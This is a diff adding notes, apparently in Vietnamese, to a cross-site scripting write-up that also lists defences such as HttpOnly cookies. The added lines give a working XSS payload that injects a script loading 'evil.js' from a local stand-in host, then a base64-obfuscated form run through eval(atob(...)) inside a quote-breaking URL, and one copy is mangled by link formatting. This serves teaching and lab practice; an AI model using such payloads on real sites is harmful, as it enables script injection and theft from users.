@@ -490,3 +490,13 @@ element.appendChild(div);
 5. Cookie nên có HttpOnly
 
 Demo: `https://drive.google.com/file/d/1H1efboj5qyqqU17R24kVbOhG9SvUt6o-/view?usp=sharing`
+
+Payload trước khi mã hóa: `var s=document.createElement('script');s.src='http://127.0.0.1:8000/evil.js';document.body.appendChild(s);`
+
+Payload trước khi base64: `var s=document.createElement('script');s.src='[http://127.0.0.1:8000/evil.js';document.body.appendChild(s](http://127.0.0.1:8000/evil.js';document.body.appendChild(s));`
+
+Payload:`http://foo?&apos;-eval(atob(&apos;dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xMjcuMC4wLjE6ODAwMC9ldmlsLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw==&apos;))-&apos;`
+
+atob(): Hàm giải mã Base64 ngược lại thành chuỗi ban đầu.
+
+eval(): Nó nhận một chuỗi văn bản và ép trình duyệt chạy nó như một đoạn code JS thực sự.
